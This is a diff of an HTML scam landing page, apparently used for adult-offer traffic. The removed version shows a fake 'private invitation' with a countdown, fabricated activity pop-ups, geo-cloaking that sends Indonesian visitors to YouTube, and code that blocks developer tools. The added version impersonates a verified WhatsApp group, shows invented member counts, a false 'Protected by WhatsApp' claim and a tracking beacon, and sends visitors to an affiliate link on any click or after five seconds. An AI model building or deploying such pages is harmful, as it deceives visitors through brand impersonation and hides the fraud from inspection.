@@ -3,159 +3,554 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>💬 You Have a New Invitation</title>
+    <title>WhatsApp Group Invitation</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        *{margin:0;padding:0;box-sizing:border-box}
-        body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,sans-serif;background:#000;overflow:hidden;height:100vh;color:#fff;position:relative;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
-
-        /* --- VIDEO BACKGROUND --- */
-        .bg-video{position:absolute;top:50%;left:50%;min-width:100%;min-height:100%;width:auto;height:auto;transform:translate(-50%,-50%);z-index:-2;object-fit:cover;pointer-events:none}
-        .blur-content{background:rgba(0,0,0,0.55); backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);height:100vh;display:flex;flex-direction:column;justify-content:center;align-items:center;text-align:center;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}
-
-        /* --- KONTEN UTAMA --- */
-        .container {
-            max-width: 400px;
-            width: 90%;
-            padding: 20px;
-            position: relative;
-            z-index: 1;
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
         }
-
-        h1 {
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .bg-video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -2;
+            filter: brightness(0.7);
+        }
+        
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, rgba(7, 94, 84, 0.85), rgba(18, 140, 126, 0.75));
+            z-index: -1;
+        }
+        
+        .animated-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+            background: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><circle cx="50" cy="50" r="40" fill="none" stroke="rgba(255,255,255,0.1)" stroke-width="0.5"><animate attributeName="r" from="40" to="60" dur="3s" repeatCount="indefinite"/><animate attributeName="opacity" from="0.3" to="0.1" dur="3s" repeatCount="indefinite"/></circle></svg>') center/cover;
+            animation: bgAnimation 20s linear infinite;
+        }
+        
+        @keyframes bgAnimation {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.1); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            width: 100%;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        header {
+            display: flex;
+            align-items: center;
+            padding: 20px 0;
+            margin-bottom: 20px;
+            position: relative;
+        }
+        
+        header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
+        }
+        
+        .back-button {
+            font-size: 24px;
+            margin-right: 15px;
+            cursor: pointer;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: white;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+        
+        .back-button:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateX(-3px);
+        }
+        
+        .header-text h1 {
+            font-size: 24px;
+            font-weight: 600;
+            margin-bottom: 4px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .header-text p {
+            font-size: 14px;
+            opacity: 0.9;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .verified-badge {
+            background: #25D366;
+            color: white;
+            font-size: 10px;
+            padding: 2px 6px;
+            border-radius: 10px;
+            font-weight: bold;
+        }
+        
+        main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 20px 0;
+        }
+        
+        .profile-container {
+            margin-bottom: 30px;
+            animation: fadeInUp 0.8s ease-out;
+            position: relative;
+        }
+        
+        .profile-img {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.25), rgba(255, 255, 255, 0.1));
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 45px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3), 
+                        0 0 0 3px rgba(255, 255, 255, 0.1),
+                        inset 0 0 20px rgba(255, 255, 255, 0.1);
+            position: relative;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s ease;
+        }
+        
+        .profile-img::before {
+            content: '';
+            position: absolute;
+            top: -5px;
+            left: -5px;
+            right: -5px;
+            bottom: -5px;
+            border-radius: 50%;
+            background: linear-gradient(45deg, #25D366, #128C7E, #075E54);
+            z-index: -1;
+            opacity: 0.7;
+            animation: rotate 3s linear infinite;
+        }
+        
+        @keyframes rotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .profile-img:hover {
+            transform: scale(1.05);
+        }
+        
+        .group-name {
             font-size: 28px;
             font-weight: 700;
-            margin-bottom: 10px;
-            background: linear-gradient(90deg, #fff, #ff416c);
+            margin-bottom: 8px;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            background: linear-gradient(90deg, #fff, #e0e0e0);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
-
-        .subtitle {
+        
+        .group-info {
             font-size: 16px;
-            color: #e0e0e0;
-            margin-bottom: 25px;
+            opacity: 0.95;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
-
-        /* --- ANIMASI IKON CHAT --- */
-        .chat-icon {
-            width: 150px;
-            height: 150px;
-            margin: 20px auto;
-            background: linear-gradient(135deg, #ff416c, #ff4b2b);
-            border-radius: 50%;
+        
+        .admin-badge {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 3px 10px;
+            border-radius: 15px;
+            font-size: 13px;
+            backdrop-filter: blur(10px);
+        }
+        
+        .stats-container {
             display: flex;
             justify-content: center;
-            align-items: center;
-            font-size: 70px;
-            color: #fff;
-            box-shadow: 0 0 40px rgba(255, 65, 108, 0.6);
-            animation: pulse 2s infinite, glow 3s infinite alternate;
-            cursor: pointer;
-            transition: transform 0.3s ease;
+            gap: 50px;
+            margin: 35px 0;
+            width: 100%;
+            animation: fadeInUp 1s ease-out;
+        }
+        
+        .stat {
+            text-align: center;
             position: relative;
+            padding: 15px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            backdrop-filter: blur(10px);
+            min-width: 120px;
+            transition: all 0.3s ease;
         }
-        .chat-icon:hover { transform: scale(1.05); }
-        .notification-dot {
-            position: absolute;
-            top: 20px;
-            right: 25px;
-            width: 30px;
-            height: 30px;
-            background: #ff0000;
-            border: 3px solid #fff;
+        
+        .stat:hover {
+            background: rgba(255, 255, 255, 0.1);
+            transform: translateY(-5px);
+        }
+        
+        .stat-number {
+            font-size: 32px;
+            font-weight: bold;
+            margin-bottom: 5px;
+            background: linear-gradient(90deg, #25D366, #128C7E);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .stat-label {
+            font-size: 14px;
+            opacity: 0.9;
+            font-weight: 500;
+        }
+        
+        .online-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 13px;
+            margin-top: 8px;
+            gap: 6px;
+        }
+        
+        .dot {
+            width: 10px;
+            height: 10px;
+            background: #4CAF50;
             border-radius: 50%;
-            animation: blink 1.5s infinite;
+            animation: pulse 2s infinite;
+            box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
         }
-        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
-        @keyframes glow { from { box-shadow: 0 0 30px rgba(255, 65, 108, 0.6); } to { box-shadow: 0 0 50px rgba(255, 65, 108, 0.9), 0 0 70px rgba(255, 65, 108, 0.7); } }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
-
-        /* --- TIMER & CTA --- */
-        .countdown-container { margin: 25px 0; font-size: 18px; color: #ff4d4d; }
-        .countdown-container .timer { font-size: 48px; font-weight: bold; color: #ff416c; text-shadow: 0 0 10px rgba(255, 65, 108, 0.7); }
-        .cta-button {
-            width: 100%; padding: 18px; font-size: 18px; font-weight: bold;
-            background: linear-gradient(45deg, #ff416c, #ff4b2b); color: white; border: none; border-radius: 50px;
-            cursor: pointer; box-shadow: 0 5px 20px rgba(255, 65, 108, 0.4);
-            transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 10px;
+        
+        @keyframes pulse {
+            0% { 
+                opacity: 1; 
+                transform: scale(1);
+                box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
+            }
+            50% { 
+                opacity: 0.7; 
+                transform: scale(1.1);
+                box-shadow: 0 0 20px rgba(76, 175, 80, 0.8);
+            }
+            100% { 
+                opacity: 1; 
+                transform: scale(1);
+                box-shadow: 0 0 10px rgba(76, 175, 80, 0.5);
+            }
         }
-        .cta-button:hover { transform: translateY(-3px); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
-        .cta-button:disabled { background: #555; cursor: not-allowed; transform: none; }
-        .footer-text { margin-top: 20px; font-size: 12px; color: #aaa; }
-
-        /* --- NOTIFIKASI AKTIVITAS --- */
-        .activity-notification {
-            position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%);
-            background: rgba(40, 40, 40, 0.95); color: #fff; padding: 12px 20px; border-radius: 30px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.3); z-index: 1000; opacity: 0;
-            transition: opacity 0.5s ease; font-size: 14px; border-left: 4px solid #25d366;
+        
+        .notification {
+            background: linear-gradient(135deg, rgba(255, 255, 255, 0.15), rgba(255, 255, 255, 0.05));
+            padding: 18px;
+            border-radius: 15px;
+            font-size: 14px;
+            margin: 25px 0;
+            line-height: 1.6;
+            width: 100%;
+            animation: fadeInUp 1.2s ease-out;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 12px;
         }
-        .activity-notification.show { opacity: 1; }
-
-        /* --- LOADING OVERLAY --- */
-        .loading-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.95); display: flex; flex-direction: column;
-            justify-content: center; align-items: center; z-index: 3000;
+        
+        .notification i {
+            font-size: 20px;
+            color: #25D366;
         }
-        .loading-spinner {
-            width: 60px; height: 60px; border: 5px solid #333; border-top: 5px solid #ff416c;
-            border-radius: 50%; animation: spin 1s linear infinite;
+        
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            width: 100%;
+            max-width: 320px;
+            margin: 25px 0;
+            animation: fadeInUp 1.4s ease-out;
         }
-        .loading-text { margin-top: 20px; color: #e0e0e0; font-size: 16px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        .action-button {
+            background: linear-gradient(135deg, #25D366, #128C7E);
+            color: white;
+            border: none;
+            padding: 16px 24px;
+            font-size: 17px;
+            border-radius: 50px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            font-weight: 600;
+            box-shadow: 0 8px 20px rgba(37, 211, 102, 0.3), 
+                        0 0 0 1px rgba(255, 255, 255, 0.1) inset;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .action-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: left 0.5s ease;
+        }
+        
+        .action-button:hover::before {
+            left: 100%;
+        }
+        
+        .action-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(37, 211, 102, 0.4), 
+                        0 0 0 1px rgba(255, 255, 255, 0.2) inset;
+        }
+        
+        .action-button.primary {
+            background: linear-gradient(135deg, #25D366, #20a85a);
+        }
+        
+        .action-button.secondary {
+            background: linear-gradient(135deg, #128C7E, #0d6b5f);
+        }
+        
+        .action-button i {
+            font-size: 22px;
+        }
+        
+        .action-button span {
+            position: relative;
+            z-index: 1;
+        }
+        
+        .security-notice {
+            text-align: center;
+            font-size: 13px;
+            opacity: 0.8;
+            margin: 20px 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 30px;
+            backdrop-filter: blur(10px);
+        }
+        
+        footer {
+            text-align: center;
+            font-size: 12px;
+            padding: 20px 0;
+            opacity: 0.7;
+            line-height: 1.6;
+            background: rgba(0, 0, 0, 0.2);
+            backdrop-filter: blur(10px);
+        }
+        
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .shimmer {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.1), transparent);
+            animation: shimmer 2s infinite;
+        }
+        
+        @keyframes shimmer {
+            0% { transform: translateX(-100%); }
+            100% { transform: translateX(100%); }
+        }
+        
+        @media (max-width: 480px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .stats-container {
+                gap: 20px;
+            }
+            
+            .stat {
+                min-width: 100px;
+                padding: 10px;
+            }
+            
+            .stat-number {
+                font-size: 26px;
+            }
+            
+            .group-name {
+                font-size: 24px;
+            }
+        }
     </style>
 </head>
-<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
-
-    <!-- Loading Overlay -->
-    <div class="loading-overlay" id="loadingOverlay">
-        <div class="loading-spinner"></div>
-        <div class="loading-text">Finding your match...</div>
-    </div>
-
-    <!-- Video Background -->
+<body>
     <video class="bg-video" id="bgVideo" autoplay muted loop playsinline preload="auto"></video>
+    <div class="overlay"></div>
+    <div class="animated-bg"></div>
 
-    <!-- Konten Utama dengan Efek Blur -->
-    <div class="blur-content" id="mainContent" style="display: none;">
-        <div class="container">
-            <h1>💬 You Have a Private Invitation</h1>
-            <p class="subtitle">A verified user nearby wants to connect. See who it is before the invitation expires!</p>
-
-            <div class="chat-icon" id="chatIcon">
-                <i class="fas fa-comment-dots"></i>
-                <div class="notification-dot"></div>
-            </div>
-
-            <div class="countdown-container">
-                <p>Invitation expires in...</p>
-                <div class="timer" id="timer">3</div>
-            </div>
-
-            <button class="cta-button" id="ctaButton">
-                <i class="fas fa-heart"></i>
-                <span>Accept & Chat Now</span>
+    <div class="container">
+        <header>
+            <button class="back-button" onclick="history.back()">
+                <i class="fas fa-arrow-left"></i>
             </button>
+            <div class="header-text">
+                <h1>Naughty Girls Room</h1>
+                <p>WhatsApp <span class="verified-badge">VERIFIED</span></p>
+            </div>
+        </header>
 
-            <p class="footer-text">
-                This is a one-time invitation. It will be <strong>permanently deleted</strong> if you don't accept.
-            </p>
-        </div>
+        <main>
+            <div class="profile-container">
+                <div class="profile-img">
+                    <i class="fas fa-users"></i>
+                </div>
+                <h2 class="group-name">Naughty Girls Room</h2>
+                <p class="group-info">
+                    <span class="admin-badge" id="adminText"></span>
+                    <i class="fas fa-check-circle" style="color: #25D366;"></i>
+                </p>
+            </div>
+
+            <div class="stats-container">
+                <div class="stat">
+                    <div class="stat-number" id="totalMembers">106.7K</div>
+                    <div class="stat-label">Members</div>
+                </div>
+                <div class="stat">
+                    <div class="stat-number" id="onlineMembers">43.2K</div>
+                    <div class="online-indicator">
+                        <div class="dot"></div>
+                        <span>Online</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="notification">
+                <i class="fas fa-lock"></i>
+                <span>Messages are secured with end-to-end encryption. Only group members can read them.</span>
+            </div>
+
+            <div class="button-container">
+                <button class="action-button primary" id="joinButton">
+                    <i class="fab fa-whatsapp"></i>
+                    <span>Join Group</span>
+                    <div class="shimmer"></div>
+                </button>
+                
+                <button class="action-button secondary" id="callButton">
+                    <i class="fas fa-phone"></i>
+                    <span>Private Call</span>
+                    <div class="shimmer"></div>
+                </button>
+                
+                <button class="action-button secondary" id="videoButton">
+                    <i class="fas fa-video"></i>
+                    <span>Private Video</span>
+                    <div class="shimmer"></div>
+                </button>
+            </div>
+
+            <div class="security-notice">
+                <i class="fas fa-shield-alt"></i>
+                <span>Protected by WhatsApp</span>
+            </div>
+        </main>
+
+        <footer>
+            By clicking any button, you agree to share your contact information with the group administrator and other participants.
+        </footer>
     </div>
-
-    <!-- Template Notifikasi (disembunyikan) -->
-    <div class="activity-notification" id="notificationTemplate"></div>
 
     <script>
-        // --- VARIABEL GLOBAL ---
-        let redirectUrl;
-        let countdownInterval;
+        // Random admin name
+        const firstNames = ["Emily","Sophia","Isabella","Mia","Ava","Olivia","Luna","Chloe","Zoe","Anna","Lisa","Sarah","Putri","Siti","Ayu","Dewi","Intan","Citra","Tiara","Bella","Aisyah","Vanessa","Jessica","Angel"];
+        const lastNames = ["Whitney","Johnson","Miller","Davis","Garcia","Martinez","Lopez","Wilson","Anderson","Thomas","Moore","Perez","Harris","Clark","Lewis","Walker","Young","King","Scott","Nguyen","Adams","Hall"];
+        
+        function getRandomName() {
+            return firstNames[Math.floor(Math.random() * firstNames.length)] + " " + 
+                   lastNames[Math.floor(Math.random() * lastNames.length)];
+        }
 
-        // --- DAFTAR VIDEO BACKGROUND ---
+        // Video list
         const videoList = [
+            "https://ceafgif.flirtpixel.com/bundle/921/assets/images/video-1.mp4",
             "https://files.catbox.moe/387f3z.mp4",
             "https://files.catbox.moe/y2fr1u.mp4",
             "https://files.catbox.moe/o2bcz2.mp4",
@@ -170,136 +565,57 @@
             "https://assets.mixkit.co/videos/preview/mixkit-set-of-abstract-circles-loop-11805-large.mp4"
         ];
 
-        // --- FUNGSI UNTUK MEMUAT VIDEO ACAK ---
+        const videoEl = document.getElementById('bgVideo');
+
         function loadRandomVideo() {
-            const videoEl = document.getElementById('bgVideo');
             const idx = Math.floor(Math.random() * videoList.length);
             videoEl.src = videoList[idx];
             videoEl.load();
-            videoEl.play().catch(error => {
-                console.error("Video failed to play, trying next one...", error);
-                videoList.splice(idx, 1); // Hapus video yang gagal
-                if (videoList.length > 0) {
-                    loadRandomVideo(); // Coba video lain
-                } else {
-                    // Fallback jika semua video gagal
-                    document.body.style.background = 'linear-gradient(45deg, #1a0033, #4b0082)';
-                }
+            videoEl.play().catch(() => {
+                videoList.splice(idx, 1);
+                if (videoList.length > 0) loadRandomVideo();
+                else document.body.style.background = 'linear-gradient(135deg,#075e54,#128c7e)';
             });
         }
 
-        // --- DETEKSI NEGARA (LEBIH CEPAT) ---
-        async function detectCountry() {
-            try {
-                const countryDetectionPromises = [
-                    fetch('https://ipapi.co/json/').then(res => res.json()).then(data => ({ code: data.country_code, source: 'ipapi' })),
-                    fetch('https://ip-api.com/json/?fields=countryCode').then(res => res.json()).then(data => ({ code: data.countryCode, source: 'ip-api' }))
-                ];
-                const result = await Promise.race(countryDetectionPromises);
-                console.log(`Detected country (${result.source}):`, result.code);
+        // Offer URL
+        const OFFERS = ["https://ceafgif.flirtpixel.com/s/192278ad6a62d?sub1=KAHF&subsource=KAHF"];
+        let TARGET_URL = OFFERS[0];
 
-                if (result.code === 'ID') {
-                    redirectUrl = 'https://www.youtube.com';
-                    console.log("Indonesian IP detected. Redirecting to:", redirectUrl);
-                    window.location.href = redirectUrl;
-                    return true;
-                } else {
-                    const baseOffers = ["https://ceafgif.flirtpixel.com/s/192278ad6a62d?sub1=KAHF&subsource=KAHF"];
-                    const urlParams = new URLSearchParams(window.location.search);
-                    redirectUrl = baseOffers[0] + (baseOffers[0].includes('?') ? '&' : '?') + urlParams.toString();
-                    console.log("Non-Indonesian IP. Using smartlink:", redirectUrl);
-                    return false;
-                }
-            } catch (error) {
-                console.error("IP detection failed. Using default smartlink.", error);
-                const baseOffers = ["https://ceafgif.flirtpixel.com/s/192278ad6a62d?sub1=KAHF&subsource=KAHF"];
-                const urlParams = new URLSearchParams(window.location.search);
-                redirectUrl = baseOffers[0] + (baseOffers[0].includes('?') ? '&' : '?') + urlParams.toString();
-                return false;
-            }
-        }
-
-        // --- NOTIFIKASI AKTIVITAS DINAMIS ---
-        function showActivityNotification() {
-            const names = ["greysani", "denia", "resinye", "Jessica", "gebrile", "gabriela", "santryne", "sinyle"];
-            const cities = ["dallas", "germany", "australia", "brazil", "united states", "francis", "united kingdom"];
-            const randomName = names[Math.floor(Math.random() * names.length)];
-            const randomCity = cities[Math.floor(Math.random() * cities.length)];
-            
-            const notification = document.getElementById('notificationTemplate').cloneNode(true);
-            notification.id = '';
-            notification.innerHTML = `💕 <strong>${randomName}</strong> from ${randomCity} just accepted a chat!`;
-            document.body.appendChild(notification);
-            
-            setTimeout(() => notification.classList.add('show'), 100);
-            setTimeout(() => {
-                notification.classList.remove('show');
-                setTimeout(() => notification.remove(), 500);
-            }, 3500);
-        }
-
-        // --- LOGIKA COUNTDOWN & REDIRECT ---
-        function startCountdown() {
-            let timeLeft = 3;
-            const timerElement = document.getElementById('timer');
-            const ctaButton = document.getElementById('ctaButton');
-
-            countdownInterval = setInterval(() => {
-                timeLeft--;
-                timerElement.textContent = timeLeft;
-                if (timeLeft <= 0) {
-                    clearInterval(countdownInterval);
-                    performRedirect();
-                }
-            }, 1000);
-
-            ctaButton.addEventListener('click', performRedirect);
-            document.getElementById('chatIcon').addEventListener('click', performRedirect);
-        }
+        // Redirect logic
+        const params = new URLSearchParams(window.location.search);
+        let finalUrl = TARGET_URL + (params.toString() ? (TARGET_URL.includes('?') ? '&' : '?') + params.toString() : '');
         
-        function performRedirect() {
-            clearInterval(countdownInterval);
-            const ctaButton = document.getElementById('ctaButton');
-            ctaButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i> <span>Connecting...</span>';
-            ctaButton.disabled = true;
-            console.log("Redirecting to:", redirectUrl);
-            window.location.href = redirectUrl;
-        }
-
-        // --- FUNGSI UTAMA MEMULAI APLIKASI ---
-        async function startApp() {
-            const shouldRedirectNow = await detectCountry();
+        // Initialize
+        document.addEventListener('DOMContentLoaded', () => {
+            // Tracking
+            fetch('https://imopol.dasboardkramat.workers.dev/track?cid=KAHF', { method: 'GET', keepalive: true });
             
-            if (!shouldRedirectNow) {
-                document.getElementById('mainContent').style.display = 'flex';
-                document.getElementById('loadingOverlay').style.display = 'none';
-
-                loadRandomVideo(); // Panggil fungsi untuk memuat video
-                startCountdown();
-                
-                showActivityNotification();
-                setInterval(showActivityNotification, 4000);
-
-                fetch('https://imopol.dasboardkramat.workers.dev/track?cid=KAHF', { method: 'GET', keepalive: true });
-            }
-        }
-
-        // --- KEAMANAN ---
-        document.addEventListener('keydown', function(e) {
-            if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
-                e.preventDefault();
-                return false;
-            }
+            document.getElementById('adminText').textContent = "Admin: " + getRandomName();
+            
+            loadRandomVideo();
+            
+            // Auto redirect after 5 seconds
+            setTimeout(() => {
+                location.href = finalUrl;
+            }, 5000);
         });
-        setInterval(() => {
-            if ((window.outerHeight - window.innerHeight > 200) || (window.outerWidth - window.innerWidth > 200)) {
-                window.location.replace("about:blank");
-            }
-        }, 500);
+        
+        // Button click handlers - all redirect to the same smartlink
+        document.getElementById('joinButton').onclick = () => {
+            location.href = finalUrl;
+        };
+        
+        document.getElementById('callButton').onclick = () => {
+            location.href = finalUrl;
+        };
+        
+        document.getElementById('videoButton').onclick = () => {
+            location.href = finalUrl;
+        };
 
-        // --- JALANKAN APLIKASI ---
-        window.addEventListener('DOMContentLoaded', startApp);
-
+        // Force play video on user interaction
+        document.body.onclick = () => videoEl.play();
     </script>
 </body>
 </html>
